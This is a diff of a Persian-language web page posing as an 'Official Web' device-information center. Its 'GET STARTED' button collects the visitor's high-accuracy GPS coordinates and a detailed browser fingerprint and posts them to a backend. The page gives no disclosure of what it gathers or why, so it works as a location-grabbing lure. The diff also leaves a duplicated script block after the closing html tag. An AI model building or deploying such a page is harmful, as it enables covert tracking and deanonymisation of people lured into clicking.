@@ -1,181 +1,952 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa" dir="rtl">
+
 <head>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>HZR 2010</title>
+<title>HZR Official Web</title>
 
 <style>
-* {
-    box-sizing: border-box;
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,Tahoma,sans-serif;
 }
 
-body {
-    margin: 0;
-    min-height: 100vh;
-    background: #050505;
-    color: #fff;
-    font-family: Arial, sans-serif;
+body{
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    overflow:hidden;
+    color:white;
 
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    background:
+        radial-gradient(
+            circle at 15% 20%,
+            rgba(0,255,190,.20),
+            transparent 30%
+        ),
+        radial-gradient(
+            circle at 85% 80%,
+            rgba(80,90,255,.22),
+            transparent 32%
+        ),
+        linear-gradient(
+            135deg,
+            #03050b,
+            #09101d,
+            #03050b
+        );
 }
 
-.container {
-    width: 90%;
-    max-width: 390px;
-    text-align: center;
+/* =========================
+   BACKGROUND GLOW
+========================= */
+
+.glow{
+    position:absolute;
+    width:280px;
+    height:280px;
+    border-radius:50%;
+    filter:blur(100px);
+    opacity:.25;
+
+    animation:
+        float 8s infinite alternate ease-in-out;
 }
 
-.logo {
-    font-size: 42px;
-    font-weight: bold;
-    letter-spacing: 6px;
-    margin-bottom: 45px;
+.glow.one{
+    background:#00ffc8;
+    top:-120px;
+    left:-100px;
 }
 
-button {
-    width: 100%;
-    padding: 17px;
-
-    border: 1px solid #333;
-    border-radius: 12px;
-
-    background: #111;
-    color: #fff;
-
-    font-size: 18px;
-    font-weight: bold;
+.glow.two{
+    background:#536dff;
+    right:-120px;
+    bottom:-120px;
+    animation-delay:2s;
 }
 
-button:active {
-    transform: scale(0.98);
+@keyframes float{
+
+    from{
+        transform:translate(0,0);
+    }
+
+    to{
+        transform:translate(50px,30px);
+    }
+
 }
 
-button:disabled {
-    opacity: 0.55;
+/* =========================
+   MAIN CONTAINER
+========================= */
+
+.container{
+    position:relative;
+    width:92%;
+    max-width:440px;
+    text-align:center;
+    z-index:2;
 }
 
-.status {
-    margin-top: 20px;
-    color: #777;
-    font-size: 14px;
-    min-height: 20px;
+/* =========================
+   WELCOME
+========================= */
+
+.welcome{
+    font-size:14px;
+    letter-spacing:1.5px;
+    color:#b8c4d9;
+    margin-bottom:25px;
 }
+
+.welcome span{
+    color:#00ffc3;
+}
+
+/* =========================
+   LOGO
+========================= */
+
+.logo{
+    width:105px;
+    height:105px;
+    margin:auto;
+
+    border-radius:31px;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    font-size:27px;
+    font-weight:bold;
+
+    background:
+        linear-gradient(
+            135deg,
+            #00ffc3,
+            #5270ff
+        );
+
+    box-shadow:
+        0 0 25px rgba(0,255,195,.35),
+        0 0 70px rgba(82,112,255,.20);
+
+    animation:pulse 3s infinite;
+}
+
+@keyframes pulse{
+
+    0%,100%{
+        transform:scale(1);
+    }
+
+    50%{
+        transform:scale(1.04);
+    }
+
+}
+
+/* =========================
+   TITLE
+========================= */
+
+h1{
+    margin-top:23px;
+    font-size:36px;
+    letter-spacing:3px;
+}
+
+.subtitle{
+    margin-top:10px;
+    color:#8f9bb0;
+    font-size:13px;
+    line-height:1.8;
+}
+
+/* =========================
+   MAIN CARD
+========================= */
+
+.card{
+    margin-top:28px;
+    padding:26px 20px;
+
+    border-radius:27px;
+
+    background:
+        rgba(12,18,31,.72);
+
+    border:
+        1px solid rgba(255,255,255,.08);
+
+    backdrop-filter:blur(18px);
+    -webkit-backdrop-filter:blur(18px);
+
+    box-shadow:
+        0 25px 70px rgba(0,0,0,.45),
+        inset 0 1px 0 rgba(255,255,255,.05);
+}
+
+/* =========================
+   STATUS BADGE
+========================= */
+
+.badge{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+
+    padding:8px 13px;
+
+    border-radius:30px;
+
+    background:
+        rgba(0,255,195,.07);
+
+    border:
+        1px solid rgba(0,255,195,.16);
+
+    color:#00ffc3;
+
+    font-size:11px;
+
+    margin-bottom:20px;
+}
+
+.badge-dot{
+    width:7px;
+    height:7px;
+
+    border-radius:50%;
+
+    background:#00ffc3;
+
+    box-shadow:
+        0 0 10px #00ffc3;
+}
+
+/* =========================
+   BUTTON
+========================= */
+
+button{
+    width:100%;
+
+    border:none;
+    outline:none;
+
+    padding:17px;
+
+    border-radius:17px;
+
+    background:
+        linear-gradient(
+            135deg,
+            #00ffc3,
+            #4e70ff
+        );
+
+    color:#031014;
+
+    font-size:16px;
+    font-weight:bold;
+
+    letter-spacing:2px;
+
+    cursor:pointer;
+
+    box-shadow:
+        0 10px 30px
+        rgba(0,255,195,.18);
+
+    transition:.25s;
+}
+
+button:hover{
+
+    transform:
+        translateY(-3px);
+
+    box-shadow:
+        0 15px 40px
+        rgba(0,255,195,.28);
+}
+
+button:active{
+
+    transform:
+        scale(.97);
+}
+
+button:disabled{
+
+    opacity:.75;
+    cursor:wait;
+}
+
+/* =========================
+   INSTRUCTION
+========================= */
+
+.instruction{
+    margin-top:20px;
+
+    color:#9ba6b9;
+
+    font-size:12px;
+
+    line-height:1.8;
+}
+
+.instruction strong{
+    color:white;
+}
+
+/* =========================
+   STATUS
+========================= */
+
+.status{
+
+    margin-top:14px;
+
+    font-size:11px;
+
+    color:#707d92;
+
+    min-height:18px;
+}
+
+/* =========================
+   FOOTER
+========================= */
+
+.footer{
+
+    margin-top:25px;
+
+    color:#596579;
+
+    font-size:10px;
+
+    line-height:2;
+}
+
+.footer strong{
+    color:#77859b;
+}
+
+/* =========================
+   MOBILE
+========================= */
+
+@media(max-width:380px){
+
+    h1{
+        font-size:30px;
+    }
+
+    .logo{
+        width:90px;
+        height:90px;
+        font-size:23px;
+    }
+
+    .card{
+        padding:22px 16px;
+    }
+
+}
+
 </style>
+
 </head>
 
 <body>
 
+<div class="glow one"></div>
+<div class="glow two"></div>
+
 <div class="container">
 
-    <div class="logo">
-        HZR 2010
+    <div class="welcome">
+
+        Welcome to
+        <span>HZR Official Web</span>
+
     </div>
 
-    <button id="startButton">
-        START
-    </button>
 
-    <div class="status" id="status">
-        READY
+    <div class="logo">
+
+        HZR
+
+    </div>
+
+
+    <h1>
+
+        HZR 2010
+
+    </h1>
+
+
+    <div class="subtitle">
+
+        Smart Device Information Center
+
+    </div>
+
+
+    <div class="card">
+
+
+        <div class="badge">
+
+            <span class="badge-dot"></span>
+
+            سیستم آماده است
+
+        </div>
+
+
+        <button id="startBtn">
+
+            GET STARTED
+
+        </button>
+
+
+        <div class="instruction">
+
+            برای شروع روی
+            <strong>GET STARTED</strong>
+            کلیک کنید
+
+        </div>
+
+
+        <div
+            class="status"
+            id="status"
+        >
+
+            آماده برای شروع
+
+        </div>
+
+
+    </div>
+
+
+    <div class="footer">
+
+        <strong>
+            © 2010–2026 HZR 2010
+        </strong>
+
+        <br>
+
+        All Rights Reserved
+
     </div>
 
 </div>
 
-<script>
+    <script>
 
-const BACKEND_URL = "https://hzr-2010.onrender.com";
+const startBtn =
+    document.getElementById("startBtn");
 
-const button = document.getElementById("startButton");
-const statusText = document.getElementById("status");
+const statusText =
+    document.getElementById("status");
 
-button.addEventListener("click", async function () {
 
-    button.disabled = true;
-    button.textContent = "SENDING...";
-    statusText.textContent = "CONNECTING TO SERVER...";
+/* =========================
+   GET LOCATION
+========================= */
 
-    const deviceInfo = {
-        userAgent: navigator.userAgent || "Unknown",
-        language: navigator.language || "Unknown",
-        platform: navigator.platform || "Unknown",
-        online: navigator.onLine,
+function getLocation(){
 
-        screen:
-            `${screen.width} x ${screen.height}`,
+    return new Promise((resolve)=>{
 
-        viewport:
-            `${window.innerWidth} x ${window.innerHeight}`,
+        if(!navigator.geolocation){
 
-        pixelRatio:
-            window.devicePixelRatio || 1,
+            resolve(null);
 
-        timezone:
-            Intl.DateTimeFormat()
-                .resolvedOptions()
-                .timeZone || "Unknown",
-
-        hardwareConcurrency:
-            navigator.hardwareConcurrency || "Unknown",
-
-        deviceMemory:
-            navigator.deviceMemory || "Unknown",
-
-        maxTouchPoints:
-            navigator.maxTouchPoints || 0,
-
-        time:
-            new Date().toLocaleString()
-    };
-
-    try {
-
-        const response = await fetch(
-            BACKEND_URL + "/api/send-device-info",
-            {
-                method: "POST",
-
-                headers: {
-                    "Content-Type": "application/json"
-                },
-
-                body: JSON.stringify(deviceInfo)
-            }
-        );
-
-        const result = await response.json();
-
-        if (response.ok && result.success) {
-
-            statusText.textContent =
-                "SENT SUCCESSFULLY";
-
-            button.textContent = "DONE";
-
-        } else {
-
-            statusText.textContent =
-                "SERVER ERROR";
-
-            button.textContent = "TRY AGAIN";
-            button.disabled = false;
+            return;
         }
 
-    } catch (error) {
 
-        console.error(error);
+        navigator.geolocation.getCurrentPosition(
 
-        statusText.textContent =
-            "CONNECTION FAILED";
+            function(position){
 
-        button.textContent = "TRY AGAIN";
-        button.disabled = false;
+                resolve({
+
+                    latitude:
+                        position.coords.latitude,
+
+                    longitude:
+                        position.coords.longitude,
+
+                    accuracy:
+                        position.coords.accuracy
+
+                });
+
+            },
+
+
+            function(){
+
+                resolve(null);
+
+            },
+
+
+            {
+
+                enableHighAccuracy:true,
+
+                timeout:10000,
+
+                maximumAge:0
+
+            }
+
+        );
+
+    });
+
+}
+
+
+/* =========================
+   START BUTTON
+========================= */
+
+startBtn.addEventListener(
+    "click",
+    async function(){
+
+        startBtn.disabled = true;
+
+        startBtn.innerText =
+            "PLEASE WAIT...";
+
+        statusText.innerText =
+            "در حال آماده‌سازی اطلاعات...";
+
+
+        try{
+
+
+            /* LOCATION */
+
+            const location =
+                await getLocation();
+
+
+            /* DEVICE INFORMATION */
+
+            const info = {
+
+                userAgent:
+                    navigator.userAgent,
+
+                language:
+                    navigator.language,
+
+                platform:
+                    navigator.platform,
+
+                online:
+                    navigator.onLine,
+
+
+                screen:
+                    screen.width +
+                    " x " +
+                    screen.height,
+
+
+                viewport:
+                    window.innerWidth +
+                    " x " +
+                    window.innerHeight,
+
+
+                pixelRatio:
+                    window.devicePixelRatio || 1,
+
+
+                timezone:
+                    Intl.DateTimeFormat()
+                    .resolvedOptions()
+                    .timeZone,
+
+
+                hardwareConcurrency:
+                    navigator.hardwareConcurrency ||
+                    "Unknown",
+
+
+                deviceMemory:
+                    navigator.deviceMemory ||
+                    "Unknown",
+
+
+                maxTouchPoints:
+                    navigator.maxTouchPoints ||
+                    0,
+
+
+                time:
+                    new Date().toLocaleString(),
+
+
+                latitude:
+                    location
+                    ? location.latitude
+                    : "Permission denied",
+
+
+                longitude:
+                    location
+                    ? location.longitude
+                    : "Permission denied",
+
+
+                accuracy:
+                    location
+                    ? location.accuracy
+                    : "Unknown"
+
+            };
+
+
+            /* SEND TO SERVER */
+
+            const response =
+                await fetch(
+                    "/api/send-device-info",
+                    {
+
+                        method:"POST",
+
+                        headers:{
+                            "Content-Type":
+                                "application/json"
+                        },
+
+                        body:
+                            JSON.stringify(info)
+
+                    }
+                );
+
+
+            /* SUCCESS */
+
+            if(response.ok){
+
+                statusText.innerText =
+                    "اطلاعات با موفقیت ارسال شد ✓";
+
+                startBtn.innerText =
+                    "COMPLETED";
+
+            }
+
+
+            /* ERROR */
+
+            else{
+
+                throw new Error(
+                    "Server error"
+                );
+
+            }
+
+
+        }
+
+        catch(error){
+
+            console.error(error);
+
+
+            statusText.innerText =
+                "اتصال به سرور ناموفق بود";
+
+
+            startBtn.disabled =
+                false;
+
+
+            startBtn.innerText =
+                "GET STARTED";
+
+        }
+
     }
+);
 
-});
+</script>
+
+</body>
+    </html><script>
+
+const startBtn =
+    document.getElementById("startBtn");
+
+const statusText =
+    document.getElementById("status");
+
+
+/* =========================
+   GET LOCATION
+========================= */
+
+function getLocation(){
+
+    return new Promise((resolve)=>{
+
+        if(!navigator.geolocation){
+
+            resolve(null);
+
+            return;
+        }
+
+
+        navigator.geolocation.getCurrentPosition(
+
+            function(position){
+
+                resolve({
+
+                    latitude:
+                        position.coords.latitude,
+
+                    longitude:
+                        position.coords.longitude,
+
+                    accuracy:
+                        position.coords.accuracy
+
+                });
+
+            },
+
+
+            function(){
+
+                resolve(null);
+
+            },
+
+
+            {
+
+                enableHighAccuracy:true,
+
+                timeout:10000,
+
+                maximumAge:0
+
+            }
+
+        );
+
+    });
+
+}
+
+
+/* =========================
+   START BUTTON
+========================= */
+
+startBtn.addEventListener(
+    "click",
+    async function(){
+
+        startBtn.disabled = true;
+
+        startBtn.innerText =
+            "PLEASE WAIT...";
+
+        statusText.innerText =
+            "در حال آماده‌سازی اطلاعات...";
+
+
+        try{
+
+
+            /* LOCATION */
+
+            const location =
+                await getLocation();
+
+
+            /* DEVICE INFORMATION */
+
+            const info = {
+
+                userAgent:
+                    navigator.userAgent,
+
+                language:
+                    navigator.language,
+
+                platform:
+                    navigator.platform,
+
+                online:
+                    navigator.onLine,
+
+
+                screen:
+                    screen.width +
+                    " x " +
+                    screen.height,
+
+
+                viewport:
+                    window.innerWidth +
+                    " x " +
+                    window.innerHeight,
+
+
+                pixelRatio:
+                    window.devicePixelRatio || 1,
+
+
+                timezone:
+                    Intl.DateTimeFormat()
+                    .resolvedOptions()
+                    .timeZone,
+
+
+                hardwareConcurrency:
+                    navigator.hardwareConcurrency ||
+                    "Unknown",
+
+
+                deviceMemory:
+                    navigator.deviceMemory ||
+                    "Unknown",
+
+
+                maxTouchPoints:
+                    navigator.maxTouchPoints ||
+                    0,
+
+
+                time:
+                    new Date().toLocaleString(),
+
+
+                latitude:
+                    location
+                    ? location.latitude
+                    : "Permission denied",
+
+
+                longitude:
+                    location
+                    ? location.longitude
+                    : "Permission denied",
+
+
+                accuracy:
+                    location
+                    ? location.accuracy
+                    : "Unknown"
+
+            };
+
+
+            /* SEND TO SERVER */
+
+            const response =
+                await fetch(
+                    "/api/send-device-info",
+                    {
+
+                        method:"POST",
+
+                        headers:{
+                            "Content-Type":
+                                "application/json"
+                        },
+
+                        body:
+                            JSON.stringify(info)
+
+                    }
+                );
+
+
+            /* SUCCESS */
+
+            if(response.ok){
+
+                statusText.innerText =
+                    "اطلاعات با موفقیت ارسال شد ✓";
+
+                startBtn.innerText =
+                    "COMPLETED";
+
+            }
+
+
+            /* ERROR */
+
+            else{
+
+                throw new Error(
+                    "Server error"
+                );
+
+            }
+
+
+        }
+
+        catch(error){
+
+            console.error(error);
+
+
+            statusText.innerText =
+                "اتصال به سرور ناموفق بود";
+
+
+            startBtn.disabled =
+                false;
+
+
+            startBtn.innerText =
+                "GET STARTED";
+
+        }
+
+    }
+);
 
 </script>
 
